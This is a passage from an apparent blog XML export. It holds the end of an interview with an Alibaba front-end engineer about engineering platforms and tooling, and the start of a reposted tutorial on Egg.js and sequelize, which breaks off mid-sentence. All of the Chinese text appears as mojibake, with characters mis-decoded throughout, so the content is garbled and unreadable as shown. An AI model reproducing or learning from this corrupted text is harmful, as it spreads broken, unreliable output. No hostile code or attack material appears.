ä¹æ²¡æœ‰æˆæœ¬åœ°å®ç°äº†ï¼Œè¿™åœ¨æ¨è¿›å‰ç«¯å·¥ç¨‹ä¸­å°ä¹‹å‰æ˜¯æ— æ³•æƒ³è±¡çš„ï¼Œå¦‚æœæ²¡æœ‰å‰æœŸçš„æ”¶æ•›æ ¹æœ¬æ— ä»ä¸‹æ‰‹ã€‚ InfoQï¼šé˜¿é‡Œå‰ç«¯å·¥ç¨‹åŒ–ä¸­å°ç›®å‰æ¨è¿›æƒ…å†µå¦‚ä½•ï¼Ÿä¸æ‚¨çš„é¢„æœŸç›¸ç¬¦å—ï¼Ÿæ‚¨ç†æƒ³çš„çŠ¶æ€åº”è¯¥æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š ç›®å‰çš„æ•´ä½“è¿›å±•è¿˜æ˜¯æ¯”è¾ƒç¬¦åˆé¢„æœŸçš„ï¼Œåœ¨æµç¨‹è§„èŒƒå’Œæ ‡å‡†åŒ–æ–¹é¢æˆ‘ä»¬å·²ç»å–å¾—äº†éå¸¸å¥½çš„æ•ˆæœï¼Œå¹¶ä¸”åœ¨æ¨è¿›å·¥ç¨‹ä¸­å°çš„å®è·µè¿‡ç¨‹ä¸­ç§¯ç´¯äº†ä¸å°‘ä¼˜ç§€çš„èƒ½åŠ›å¹³å°ï¼Œè¿™äº›éƒ½æ˜¯å®è´µçš„èµ„äº§ã€‚ å½“ç„¶ç­‰ç€æˆ‘ä»¬å»åšçš„äº‹æƒ…è¿˜å¾ˆå¤šï¼Œæœ‰ä¸¤ä»¶äº‹æƒ…æ˜¯æˆ‘ä»¬åç»­çš„é‡ç‚¹ã€‚ç¬¬ä¸€ä»¶äº‹æ˜¯å¼€æ”¾çš„ IDE ç”Ÿæ€å»ºè®¾ï¼Œç»è¿‡å¤§åŠå¹´çš„å°é—­å¼€å‘æˆ‘ä»¬å·²ç»å®Œæˆäº†ä»£å·ä¸º â€œå¼€å¤©â€ çš„ IDE Framework çš„ç ”å‘ï¼ŒIDE Framework æ˜¯ IDE çš„æ ¸å¿ƒï¼Œé€šè¿‡ â€œå¼€å¤©â€ IDE Framework æ„å»ºçš„å„ç§ IDE å®ç°ï¼ˆWeb æˆ–æœ¬åœ°ï¼‰æ¥æ‰“é€šç ”å‘ç”Ÿæ€ã€‚å¾…å†è¿›ä¸€æ­¥å®Œå–„åï¼Œæˆ‘ä»¬å°†å¼€æºæ•´ä½“çš„ IDE è§£å†³æ–¹æ¡ˆï¼ŒåŒ…æ‹¬å¼€æ”¾çš„æ‰©å±•ç”Ÿæ€ä½“ç³»ã€Web IDE å®¹å™¨ä¾§èƒ½åŠ›ç­‰ã€‚æœªæ¥é˜¿é‡Œå‰ç«¯çš„å·¥ç¨‹ä½“ç³»ä¸€å®šæ˜¯å›´ç»•ç€ IDE å±•å¼€çš„ã€‚ ç¬¬äºŒä»¶äº‹æƒ…è·Ÿå¼€æ”¾ç›¸å…³ï¼Œç›®å‰æˆ‘ä»¬æ‰€æœ‰çš„å·¥ç¨‹èƒ½åŠ›éƒ½æ˜¯æœåŠ¡äºå†…éƒ¨å‘˜å·¥çš„ï¼Œæˆ‘ä»¬æœŸæœ›å€ŸåŠ©é˜¿é‡Œäº‘èƒ½å¤Ÿä»¥å¹³å°åŒ–ã€ä½“ç³»åŒ–å’Œäº§å“åŒ–åœ°æ–¹å¼è¾“å‡ºé˜¿é‡Œçš„å‰ç«¯å·¥ç¨‹å®è·µï¼ŒæœåŠ¡ç¤¾åŒºæœåŠ¡è¡Œä¸šï¼Œä¸ºæ¨è¿›å›½å†…å‰ç«¯çš„å‘å±•å‡ºä¸€ä»½åŠ›ã€‚ InfoQï¼šåœ¨å‰ç«¯å·¥ç¨‹åŒ–ä¸­å°æ¨è¿›è¿‡ç¨‹ä¸­ï¼Œæ¥è‡ªå‰ç«¯å›¢é˜Ÿçš„åé¦ˆæ˜¯ä»€ä¹ˆï¼Ÿæœ‰æ²¡æœ‰é‡åˆ°ä»€ä¹ˆå›°éš¾ï¼Œä½ ä»¬æ˜¯å¦‚ä½•è§£å†³çš„ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š å›°éš¾è‚¯å®šæœ‰ï¼Œå‰é¢ä¹Ÿæœ‰è®²åˆ°ï¼Œåœ¨é˜¿é‡Œå·´å·´å¦‚æ­¤åºå¤§çš„ä½“ç³»å†…ï¼Œå¤šéƒ¨é—¨çš„åè°ƒå’Œè½åˆ°é‡åˆ°é˜»ç¢åœ¨æ‰€éš¾å…ï¼Œå…³é”®æ˜¯æ‰¾åˆ°æ­£ç¡®çš„è§£å†³æ–¹æ³•ã€‚åœ¨æ¯ä¸ªå‰ç«¯å›¢é˜Ÿä¸­ï¼Œå¯¹äºå·¥ç¨‹åŒ–å¸¦æ¥çš„æ”¶ç›Šåœ¨ä¸ªä½“ä¸å›¢é˜Ÿæ•´ä½“çš„ä½“æ„Ÿå·®å¼‚æ˜¯å¾ˆå¤§çš„ï¼Œè¿™ä¸ªæ€ä¹ˆç†è§£å‘¢ï¼Ÿæˆ‘åœ¨å¾ˆå¤šåœºåˆè¡¨è¾¾è¿‡ï¼Œè¶Šæ˜¯å®Œå–„çš„å·¥ç¨‹ä½“ç³»å¯¹ä¸ªä½“çš„çº¦æŸå¾€å¾€æ˜¯è¶Šå¼ºçš„ï¼Œå¸¦æ¥çš„ç»“æœå¯èƒ½æ˜¯ä¸ªä½“çš„æ•ˆç‡åè€Œæ˜¯ä¸‹é™ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨æ¨è¿›å·¥ç¨‹ä¸­å°æ—¶ï¼Œæ¥è‡ªä¸€çº¿çš„åå¯¹å’ŒæŠ±æ€¨å£°æ˜¯è›®å¸¸è§çš„ã€‚ä½†å¦‚æœæˆ‘ä»¬æ¢ä¸ªè§†è§’ï¼Œä»å›¢é˜Ÿæ•´ä½“çš„è§’åº¦å»çœ‹å¾…æ•ˆç‡è¿™ä¸ªé—®é¢˜ï¼Œä¸€å®šæ˜¯èƒ½è¾¾åˆ° 1+ 1 å¤§äº 2 çš„æ•ˆæœçš„ï¼Œç‰¹åˆ«æ˜¯è§„æ¨¡è¶Šå¤§çš„å›¢é˜Ÿæ•ˆæœè¶Šæ˜æ˜¾ã€‚æ‰€ä»¥åœ¨å‰ç«¯å·¥ç¨‹ä¸­å°çš„å»ºè®¾å’Œæ¨è¿›ä¸­ï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘çš„éƒ½æ˜¯å¦‚ä½•å¸®åŠ©å›¢é˜Ÿæ•´ä½“è·å¾—æ›´é«˜çš„æ”¶ç›Šã€‚ InfoQï¼šæ‚¨è®¤ä¸ºå‰ç«¯å·¥ç¨‹åŒ–ä¸­å°æ˜¯å¤§åŠ¿æ‰€è¶‹å—ï¼Ÿæ¨è¿›è¿‡ç¨‹ä¸­å¯èƒ½è¿˜ä¼šé‡åˆ°å“ªäº›æŒ‘æˆ˜ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š å‰ç«¯å·¥ç¨‹ä¸æ˜¯ä¸‡é‡‘æ²¹ï¼Œå®ƒæ˜¯åœ¨ç‰¹å®šåœºæ™¯åŠç‰¹å®šæ—¶æœŸçš„é’ˆå¯¹æ€§è§£å†³æ–¹æ¡ˆï¼Œè¶Šæ˜¯å®Œç¾ã€è¶Šæ˜¯é«˜æ•ˆçš„å·¥ç¨‹è§£å†³æ–¹æ¡ˆè¶Šæ˜¯è¢«æ‰€æœåŠ¡çš„ç»„ç»‡ç»“æ„å’ŒæŠ€æœ¯æ¶æ„æ‰€çº¦æŸï¼Œæ‰€ä»¥å¯¹æˆ‘åˆé€‚çš„å‰ç«¯å·¥ç¨‹è§£å†³æ–¹æ¡ˆå¯¹ä½ æœªå¿…åˆé€‚ã€‚ å‰ç«¯å·¥ç¨‹åŒ–ä¸€å®šæ˜¯å¤§è¶‹åŠ¿ï¼Œä½†ä¸å»ºè®®å¤§å®¶ç›²ç›®åœ°è¿½æ±‚å·¥ç¨‹åŒ–ã€‚ä»»ä½•ä½“ç³»æˆ–å¹³å°çš„å»ºè®¾éƒ½æ˜¯éœ€è¦æŠ•å…¥æˆæœ¬çš„ï¼Œè¿˜æ˜¯è¦ç»“åˆè‡ªèº«ç»„ç»‡ç‰¹ç‚¹ï¼Œå…ˆæ¸…æ¥šåœ°è®¤è¯†è‡ªå·±æ‰€å¤„çš„é˜¶æ®µï¼Œè®¡ç®—æ¸…æ¥šæŠ•å…¥äº§å‡ºæ¯”ã€‚å¦‚æœæ˜¯ 10 äººä»¥ä¸‹çš„å°è§„æ¨¡çš„å›¢é˜Ÿï¼Œé€‚å½“åˆ¶å®šç ”å‘è§„èŒƒå³å¯ï¼›10 - 30 äººè§„æ¨¡çš„å›¢é˜Ÿå¯ä»¥åˆ¶å®šä¸€äº›ç ”å‘è§„èŒƒã€è½åœ°å·¥å…·å’Œæµç¨‹ï¼›30 äººä»¥ä¸Šå›¢é˜Ÿè§„æ¨¡å°±è¦å¼€å§‹ä½“ç³»åŒ–æ€è€ƒå‰ç«¯å·¥ç¨‹èƒ½åŠ›çš„å»ºè®¾äº†ã€‚ä¸­å°äº¦æ˜¯å¦‚æ­¤ï¼Œä¸è¦ä¸ºäº†ä¸­å°è€Œä¸­å°ï¼Œå…ˆæƒ³æ˜ç™½è¦è§£å†³ä»€ä¹ˆé—®é¢˜ã€‚ InfoQï¼šæœºå™¨å­¦ä¹ åœ¨å¤§å‰ç«¯é¢†åŸŸä¹Ÿæ­£æˆä¸ºä¸€é¡¹è¶Šæ¥è¶Šé‡è¦çš„æŠ€æœ¯èƒ½åŠ›ï¼Œé˜¿é‡Œå‰ç«¯å›¢é˜Ÿåœ¨æ™ºèƒ½åŒ–æ–¹å‘ä¸Šè¿˜æœ‰å“ªäº›æ¢ç´¢å·¥ä½œï¼Ÿæ‚¨å¦‚ä½•çœ‹å¾…å‰ç«¯æ™ºèƒ½åŒ–çš„ç°çŠ¶å’Œæœªæ¥å‘å±•ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š é˜¿é‡Œå‰ç«¯å¸ƒå±€æœºå™¨å­¦ä¹ é¢†åŸŸç›¸å¯¹è¾ƒæ—©ï¼Œå‰ç«¯æ™ºèƒ½åŒ–ä½“ç³»å»ºè®¾å·²ç»è¿ç»­ä¸¤å¹´ä½œä¸ºç»æµä½“å‰ç«¯å§”å‘˜ä¼šçš„æŠ€æœ¯é¡¹ç›®ä¹‹ä¸€äº†ã€‚å¹¶ä¸”ä¹Ÿå·²ç»æœ‰äº†ç›¸å…³çš„æˆå‹äº§å“ï¼šimgcookï¼ˆ https://www.imgcook.com/ ï¼‰ã€‚imgcook åŸºäºå¤§æ•°æ®æœºå™¨å­¦ä¹ ï¼Œå¯ä»¥æ™ºèƒ½åœ°å°†è®¾è®¡ç¨¿è½¬æ¢æˆå‰ç«¯ä»£ç ï¼Œåœ¨ 2019 å¹´åŒåä¸€å¼€å§‹å°±å·²ç»å¤§é‡åº”ç”¨åˆ°ä¼šåœºé¡µé¢çš„å¼€å‘ã€‚è¿˜åŸç²¾åº¦ä¸šç•Œé¢†å…ˆï¼Œå¹¶ä¸”æ”¯æŒè‡ªå®šä¹‰æ‰©å±• DSLï¼Œå¤§å®¶æœ‰å…´è¶£å¯ä»¥è®¿é—®å®˜ç½‘è¯¦ç»†äº†è§£ã€‚ åŸºäºæœºå™¨å­¦ä¹ çš„æ™ºèƒ½åŒ–è¾…åŠ©å¼€å‘æ˜¯å‰ç«¯é¢†åŸŸçš„ä¸‹ä¸€ä¸ªæŠ€æœ¯é£å£ï¼Œæˆ‘æ‰€çŸ¥é“çš„å›½å†…å›½å¤–ä¸å°‘å¤§å…¬å¸éƒ½åœ¨åšã€‚è¿™ä¸ªé¢†åŸŸåœ¨åŸºç¡€æŠ€æœ¯æ–¹é¢çš„å‘å±•å·²ç»æ¯”è¾ƒå®Œå¤‡ï¼Œä¸è¿‡ç›®å‰å‰ç«¯åœ¨è¿™æ–¹é¢çš„äººæ‰å‚¨å¤‡è¿˜éå¸¸ä¸è¶³ï¼Œæœ‰å…´è¶£çš„å‰ç«¯åŒå­¦å¯ä»¥å¤šäº†è§£äº†è§£ã€‚ InfoQï¼š**æ‚¨å°†åœ¨æœ¬æ¬¡ QCon åŒ—äº¬ 2020 ä¸Šæ‹…ä»»â€œå¤§å‰ç«¯å¤§å·¥ç¨‹â€ä¸“é¢˜çš„å‡ºå“äººï¼Œèƒ½å¦è·Ÿæˆ‘ä»¬è¯¦ç»†è°ˆè°ˆæ‰€è°“â€œå¤§å‰ç«¯å¤§å·¥ç¨‹â€æŒ‡çš„æ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸ªä¸“é¢˜å°†ä¼šè·Ÿå¤§å®¶é‡ç‚¹åˆ†äº«å“ªäº›å†…å®¹ï¼Ÿ** æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š å¤§å‰ç«¯çš„æ¦‚å¿µåº”è¯¥ä¸éœ€è¦è¿‡å¤šä»‹ç»äº†ï¼Œä¼ ç»Ÿçš„ HTMLã€CSS å’Œ JS å·²ç»å®Œå…¨æ— æ³•å®šä¹‰å½“ä¸‹çš„å‰ç«¯ã€‚å¤§å·¥ç¨‹å…¶å®æ˜¯è·Ÿå¤§å‰ç«¯ç›¸å¯¹åº”çš„ï¼Œä»…ä»…åªæ˜¯æ„å»ºã€å·¥å…·å’Œè§„èŒƒç­‰å¸¸è§„æ–¹å¼ä¹Ÿå·²ç»ä¸è¶³ä»¥è¡¨è¾¾å½“ä¸‹å‰ç«¯å·¥ç¨‹æ‰€æ¶‰åŠçš„é¢†åŸŸã€‚ä¸ºäº†æå‡ç ”å‘æ•ˆç‡ã€ä¸ºäº†ä¿éšœå¤§è§„æ¨¡ååŒã€ä¸ºäº†æ¿€å‘ä¸šåŠ¡åˆ›æ–°ï¼Œå„å¤§å‚çš„å‰ç«¯å›¢é˜Ÿåœ¨å·¥ç¨‹é¢†åŸŸä¸æ–­æ‹“å±•æ€è·¯ï¼Œçªç ´ç•Œé™ï¼›ä¼˜ç§€çš„åˆåˆ›ä¼ä¸šä¹Ÿä»ä¸­å¦è¾Ÿè¹Šå¾„ï¼Œæ¢é“åˆ›æ–°ã€‚å¦‚æ­¤ç¹è£çš„å‰ç«¯å·¥ç¨‹ç”Ÿæ€ä¹Ÿåªæœ‰å«å¤§å·¥ç¨‹æ‰é…å¾—ä¸Šäº†ã€‚æœ¬å±Š QCon è¯¥ä¸“é¢˜å°†éµå¾ª â€œå¤§å‰ç«¯å¤§å·¥ç¨‹â€ çš„å®šä½å½»åº•æ‰“å¼€å‰ç«¯å·¥ç¨‹å®è·µé¢†åŸŸï¼Œæˆ‘ä»¬ä¼šé‚€è¯·å›½å†…å„å¤§å‚çš„ä¼˜ç§€å‰ç«¯å›¢é˜Ÿæ¥åˆ†äº«å¦‚ä½•é€šè¿‡åˆ›æ–°å·¥ç¨‹ç­‰æ‰‹æ®µæ¥è§£å†³æé™ä¸šåŠ¡è¯‰æ±‚ã€‚é™¤äº†å®è·µä¹‹å¤–è¿˜ä¼šæœ‰å‡ ä¸ªå‰ç«¯å·¥ç¨‹ç›¸å…³çš„åŸºç¡€æŠ€æœ¯ï¼ˆWebpack ç­‰ï¼‰åˆ†äº«ï¼Œè¿™å—ä»¥æµ·å¤–å˜‰å®¾ä¸ºä¸»ã€‚ InfoQï¼šå¤§å‰ç«¯é¢†åŸŸæ¶‰åŠçš„å·¥ç¨‹èƒ½åŠ›è¶Šæ¥è¶Šå¤šæ ·åŒ–ã€å¤æ‚åŒ–ï¼Œè¿™æ˜¯å¦æ„å‘³ç€å‰ç«¯å°†è¿›å…¥ä¸€ä¸ªæ–°çš„é˜¶æ®µï¼Ÿå‰ç«¯å·¥ç¨‹å¸ˆå¦‚ä½•åšå¥½å‡†å¤‡ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š å…¶å®å‰ç«¯ä¸€ç›´åœ¨ä¸åœçš„è¿›å…¥æ–°é˜¶æ®µï¼Œâ€œå­¦ä¸åŠ¨äº†â€ è¿™ä¸ªç¬‘è¯å¾ˆå¥½åœ°é˜é‡Šäº†å‰ç«¯æŠ€æœ¯é¢†åŸŸçš„è¿­ä»£å˜åŒ–ä¹‹å¿«ã€‚æˆ‘è®¤ä¸ºå·¥ç¨‹èƒ½åŠ›çš„å®Œå¤‡ç¨‹åº¦ï¼Œå¯ä»¥éå¸¸ç›´æ¥åœ°ä½“ç°ä¸€ä¸ªæŠ€æœ¯çš„æˆç†Ÿåº¦ã€‚å®Œå–„çš„å·¥ç¨‹èƒ½åŠ›å¿…ç„¶å‚¬ç”Ÿå·¥ä½œå†…å®¹çš„ç»†åˆ†ï¼Œå¹¶æœ‰æ•ˆé™ä½ç»†åˆ†é¢†åŸŸçš„å…¥é—¨é—¨æ§›ã€‚åŒæ—¶ä¹Ÿä¼šå¿…ç„¶ä¼šæ·˜æ±°å¤§é‡ä½çº§åŠ³åŠ¨åŠ›ï¼Œç‰¹åˆ«æ˜¯åœ¨è‡ªåŠ¨åŒ–ã€æ™ºèƒ½åŒ–æ–¹å‘çš„å·¥ç¨‹å®è·µï¼Œæœªæ¥ä¸€å®šä¼šæ·˜æ±°ä¸€å¤§æ‰¹å…¥é—¨çº§çš„å‰ç«¯å·¥ç¨‹å¸ˆã€‚å¦‚æœä¸€å®šè¦ç»™å»ºè®®çš„è¯ï¼Œå¯¹äºé‚£äº›ç›®å‰å·²ç»åœ¨å‰ç«¯å²—ä½çš„åŒå­¦ï¼Œæˆ‘å»ºè®®è¦æ‰¾åˆ°è‡ªå·±åœ¨å‰ç«¯çš„ç»†åˆ†é¢†åŸŸï¼Œç„¶åæŒç»­æ·±å…¥ä¸‹å»ã€‚ é‡‡è®¿å˜‰å®¾ä»‹ç»ï¼š æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼Œé˜¿é‡Œå·´å·´é«˜çº§å‰ç«¯æŠ€æœ¯ä¸“å®¶ã€‚2009 å¹´åŠ å…¥æ·˜å®ç½‘ï¼Œè´Ÿè´£è¿‡æ·˜å®äº¤æ˜“ã€å•†å“ç­‰åŸºç¡€ä¸šåŠ¡åŠæœºç¥¨å½©ç¥¨ã€ä¸€æ·˜ç­‰åˆ›æ–°ä¸šåŠ¡ã€‚2013 å¹´å¼€å§‹ä¸“æ³¨äºå‰ç«¯å·¥ç¨‹åŒ–é¢†åŸŸï¼Œæ¨åŠ¨å¼€å‘å·¥å…·ã€æµç¨‹å’Œè§„èŒƒçš„ç»Ÿä¸€ï¼Œå®Œæˆæ·˜å®è¿‘ç™¾äººå‰ç«¯å›¢é˜Ÿç ”å‘æ¨¡å¼çš„æ•´ä½“å‡çº§ã€‚ç›®å‰è´Ÿè´£é˜¿é‡Œé›†å›¢å‰ç«¯å·¥ç¨‹åŒ–ä¸­å°çš„å»ºè®¾ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸºäº Egg.js æ¡†æ¶çš„ Node.js æœåŠ¡æ„å»ºä¹‹ç”¨æˆ·ç®¡ç†è®¾è®¡]]></title>
    <url>%2F2020%2F03%2F18%2FNode.js%2F%E5%9F%BA%E4%BA%8E%20Egg.js%20%E6%A1%86%E6%9E%B6%E7%9A%84%20Node.js%20%E6%9C%8D%E5%8A%A1%E6%9E%84%E5%BB%BA%E4%B9%8B%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E8%AE%BE%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5b0374c66fb9a07acc12089d å‰è¨€è¿‘æ¥å…¬å¸éœ€è¦æ„å»ºä¸€å¥— EMMï¼ˆEnterprise Mobility Managementï¼‰çš„ç®¡ç†å¹³å°ï¼Œå°±è¿™ç§é¢å‘ä¼ä¸šçš„åº”ç”¨ç®¡ç†æœ¬èº«éœ€è¦è€ƒè™‘çš„éœ€æ±‚æ˜¯ååˆ†å¤æ‚çš„ï¼ŒæŠ€æœ¯å±‚é¢ç®¡ç†ç«¯å’ŒæœåŠ¡ç«¯æ„å»ºæ˜¯æ¶æ„æ ¸å¿ƒï¼Œå®¢æˆ·ç«¯æœ¬èº«åˆæœŸå€’ä¸éœ€è¦é‚£ä¹ˆå¤æ‚ï¼Œä½œä¸ºç§»åŠ¨ç«¯çš„è´Ÿè´£äººï¼ˆå…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªæ‰“æ‚çš„å°ç»„é•¿ï¼‰ï¼Œè¿™ä¸ªå¹³å°æ¶æ„æˆ‘è‡ªç„¶æ˜¯å…ä¸äº†å»å‚ä¸çš„ï¼Œä½œä¸ºä¸€ä¸ªå‰ç«¯ jser æ¥å…¬å¸è¿™è¾¹æ€»æ˜¯æ¥åˆ°è¿™ç§ä¸å¤ªåƒå‰ç«¯çš„å·¥ä½œï¼Œè¦æ˜¯ä»¥å‰æˆ‘å¯èƒ½ä¼šæœ‰äº›æŠµè§¦è¿™ç§ä¸šåŠ¡å±‚é¢éœ€è¦è€ƒè™‘çš„å¾ˆå¤šï¼ŒæŠ€æœ¯å®ç°æœ¬èº«åˆä¸å¤ªå®¹æ˜“ç§¯ç´¯æŠ€æœ¯æˆé•¿çš„æ´»ã€‚è¿™ä¸€å¹´æˆ‘æˆé•¿äº†å¤ªå¤šï¼Œæ€»æ˜¯å°è¯•ç€å»åšä¸€äº›å¯èƒ½è‡ªå·±è°ˆä¸ä¸Šå–œæ¬¢ä½†è¿˜æ˜¯æœ‰æ„ä¹‰çš„äº‹æƒ…ï¼Œæ‰€ä»¥è¿™æ¬¡æ¥æ‰‹è¿™ä¸ªä»»åŠ¡è¿˜æ˜¯æƒ³å¥½å¥½æŠŠè¿™ä¸ªäº‹æƒ…åšå¥½ï¼Œæ‰€ä»¥æƒ³è€ƒè™‘å‚ä¸åˆ° EMM æœåŠ¡ç«¯æ„å»ºã€‚å…¶å®è¯åˆè¯´å›æ¥ï¼Œä»»ä½•äº‹åªè¦æƒ³å»æŠŠå®ƒåšå¥½ï¼Œæ€ä¹ˆä¼šå­˜åœ¨æœ‰æ„ä¹‰è¿˜æ˜¯æ²¡æ„ä¹‰çš„åŒºåˆ«å‘¢ï¼Ÿ è€ƒè™‘åˆ°åŸºäº Node.js æ„å»ºçš„æœåŠ¡ç›®å‰è¶Šæ¥è¶Šæµè¡Œï¼Œä¹Ÿæ–¹ä¾¿åç»­æ”¾åœ¨å¹³å°å®¹å™¨äº‘ä¸Šæ„å»ºå¾®æœåŠ¡ï¼Œå¦å¤–ä½œä¸ºä¸€ä¸ªå‰ç«¯ jser å‡ºèº«çš„ç¨‹åºå‘˜ï¼Œä½¿ç”¨ Node.js æ¥æ„å»ºæœåŠ¡æ ¼å¤–ç†Ÿæ‚‰ã€‚ä¹‹å‰å­¦ä¹ è¿‡ä¸€æ®µæ—¶é—´ Egg.jsï¼Œè¿™æ¬¡æ¯«ä¸çŠ¹è±«çš„é€‰æ‹©äº†åŸºäº Egg.js æ¡†æ¶æ¥æ­å»ºã€‚ ä¸ºä»€ä¹ˆæ˜¯ Egg.js ï¼Ÿå»å¹´åœ¨ gitchat JavaScript è¿›é˜¶ä¹‹ Vue.js + Node.js å…¥é—¨å®æˆ˜å¼€å‘ ä¸­å®‰åˆ©è¿‡ Egg.jsï¼Œé‚£ä¸ªæ—¶å€™æ˜¯åˆæ¥è§¦ Egg.jsï¼Œä½†æ˜¯è¿˜æ˜¯è¢«å®ƒæƒŠè‰³åˆ°äº†ï¼ŒEgg ç»§æ‰¿äº Koaï¼Œå¥‰è¡Œã€çº¦å®šä¼˜äºé…ç½®ã€ï¼ŒæŒ‰ç…§ä¸€å¥—ç»Ÿä¸€çš„çº¦å®šè¿›è¡Œåº”ç”¨å¼€å‘ï¼Œæ’ä»¶æœºåˆ¶ä¹Ÿæ¯”è¾ƒå®Œå–„ã€‚è™½ç„¶è¯´ Egg ç»§æ‰¿äº Koaï¼Œå¤§å®¶å¯èƒ½è§‰å¾—å®Œå…¨å¯ä»¥è‡ªå·±åŸºäº Koa å»å®ç°ä¸€å¥—ï¼Œæ²¡å¿…è¦åŸºäºè¿™ä¸ªæ¡†æ¶å»æï¼Œä½†æ˜¯å…¶å®è‡ªå·±å»è®¾è®¡ä¸€å¥—è¿™æ ·çš„æ¡†æ¶ï¼Œæœ€ç»ˆä¹Ÿæ˜¯éœ€è¦å»å€Ÿé‰´å„å®¶æ‰€é•¿ï¼Œæ—¶é—´æˆæœ¬ä¸ŠçŸ­æœŸæ˜¯åˆ’ä¸æ¥çš„ã€‚Koa æ˜¯ä¸€ä¸ªå°è€Œç²¾çš„æ¡†æ¶ï¼Œè€Œ Egg æ­£å¦‚æ–‡æ¡£è¯´çš„ä¸ºä¼ä¸šçº§æ¡†æ¶å’Œåº”ç”¨è€Œç”Ÿï¼Œå¯¹äºæˆ‘ä»¬å¿«é€Ÿæ­å»ºä¸€ä¸ªå®Œå¤‡çš„ä¼ä¸šçº§åº”ç”¨è¿˜æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚Egg åŠŸèƒ½å·²ç»æ¯”è¾ƒå®Œå–„ï¼Œå¦å¤–å¦‚æœæ²¡æœ‰å®ç°çš„åŠŸèƒ½ï¼Œè‡ªå·±æ ¹æ® Koa ç¤¾åŒºæä¾›çš„æ’ä»¶å°è£…ä¸€ä¸‹ä¹Ÿæ˜¯ä¸éš¾çš„ã€‚ ORM è®¾è®¡é€‰å‹åœ¨æ•°æ®åº“é€‰æ‹©ä¸Šæœ¬æ¬¡é¡¹ç›®è€ƒè™‘ä½¿ç”¨ MySQLï¼Œè€Œä¸æ˜¯ MongoDBï¼Œå¼€å§‹ä½¿ç”¨çš„æ˜¯ egg-mysql æ’ä»¶ï¼Œå†™äº†ä¸€éƒ¨åˆ†åå‘ç° service é‡Œé¢å†™äº†å¤ªå¤šä¸œè¥¿ï¼Œè¡¨å­—æ®µä¿®æ”¹ä¼šå½±å“å¤ªå¤šä»£ç ï¼Œåœ¨è®¾è®¡ä¸Šç¼ºä¹å¯¹ Model çš„ç®¡ç†ï¼Œçœ‹åˆ°èµ„æ–™è¯´å¯ä»¥å¼•å…¥ ORM æ¡†æ¶ï¼Œæ¯”å¦‚ sequelizeï¼Œè€Œ Egg å®˜æ–¹æ°å¥½æä¾›äº† egg-sequelize æ’ä»¶ã€‚ ä»€ä¹ˆæ˜¯ ORM ?é¦–å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ ORM ? å¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆè‹±è¯­ï¼šObject Relational Mappingï¼Œç®€ç§° ORMï¼Œæˆ– O/RMï¼Œæˆ– O/R mappingï¼‰ï¼Œæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡æŠ€æœ¯ï¼Œç”¨äºå®ç°é¢å‘å¯¹è±¡ç¼–ç¨‹è¯­è¨€é‡Œä¸åŒç±»å‹ç³»ç»Ÿçš„æ•°æ®ä¹‹é—´çš„è½¬æ¢ã€‚ä»æ•ˆæœä¸Šè¯´ï¼Œå®ƒå…¶å®æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå¯åœ¨ç¼–ç¨‹è¯­è¨€é‡Œä½¿ç”¨çš„â€œè™šæ‹Ÿå¯¹è±¡æ•°æ®åº“â€ã€‚ ç±»ä¼¼äº J2EE ä¸­çš„ DAO è®¾è®¡æ¨¡å¼ï¼Œå°†ç¨‹åºä¸­çš„æ•°æ®å¯¹è±¡è‡ªåŠ¨åœ°è½¬åŒ–ä¸ºå…³ç³»å‹æ•°æ®åº“ä¸­å¯¹åº”çš„è¡¨å’Œåˆ—ï¼Œæ•°æ®å¯¹è±¡é—´çš„å¼•ç”¨ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªå·¥å…·è½¬åŒ–ä¸ºè¡¨ã€‚è¿™æ ·å°±å¯ä»¥å¾ˆå¥½çš„è§£å†³æˆ‘é‡åˆ°çš„é‚£ä¸ªé—®é¢˜ï¼Œå¯¹äºè¡¨ç»“æ„ä¿®æ”¹å’Œæ•°æ®å¯¹è±¡æ“ä½œæ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„éƒ¨åˆ†ï¼Œä»è€Œä½¿å¾—ä»£ç æ›´å¥½ç»´æŠ¤ã€‚å…¶å®æ˜¯å¦é€‰æ‹© ORM æ¡†æ¶ï¼Œå’Œä»¥å‰å‰ç«¯æ˜¯é€‰æ‹©æ¨¡æ¿å¼•æ“è¿˜æ˜¯æ‰‹åŠ¨æ‹¼å­—ç¬¦ä¸²ä¸€æ ·ï¼ŒORM æ¡†æ¶é¿å…äº†åœ¨å¼€å‘çš„æ—¶å€™æ‰‹åŠ¨æ‹¼æ¥ SQL è¯­å¥ï¼Œå¯ä»¥é˜²æ­¢ SQL æ³¨å…¥ï¼Œå¦å¤–ä¹Ÿå°†æ•°æ®åº“å’Œæ•°æ® CRUD è§£è€¦ï¼Œæ›´æ¢æ•°æ®åº“ä¹Ÿç›¸å¯¹æ›´å®¹æ˜“ã€‚ sequelize æ¡†æ¶sequelize æ˜¯ Node.js ç¤¾åŒºæ¯”è¾ƒæµè¡Œçš„ä¸€ä¸ª ORM æ¡†æ¶ï¼Œç›¸å…³æ–‡æ¡£ï¼š sequelize.js 